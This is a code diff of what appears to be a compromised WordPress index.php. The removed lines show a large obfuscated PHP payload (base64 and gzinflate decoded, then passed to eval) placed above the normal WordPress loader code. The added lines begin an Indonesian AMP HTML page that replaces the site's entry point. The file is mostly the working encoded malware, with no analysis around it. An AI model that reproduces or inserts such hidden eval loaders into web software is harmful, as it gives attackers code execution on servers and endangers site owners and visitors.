@@ -1,23 +1,2094 @@
-<?php
-$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "=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";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-?>
 
-<?php		
-/**		
-* Front to the WordPress application. This file doesn't do anything, but loads		
-* wp-blog-header.php which does and tells WordPress to load the theme.		
-*		
-* @package WordPress		
-*/		
-		
-/**		
-* Tells WordPress to load the WordPress theme and output it.		
-*		
-* @var bool		
-*/		
-define( 'WP_USE_THEMES', true );		
-		
-/** Loads the WordPress Environment and Template */		
-require __DIR__ . '/wp-blog-header.php';		
+<!DOCTYPE html>
+<html lang="id" amp i-amphtml-binding i-amphtml-layout i-amphtml-no-boilerplate transformed="self;v=1" itemscope="itemscope" itemtype="https://schema.org/WebPage">
+  <head>
+    <meta charset="utf-8">
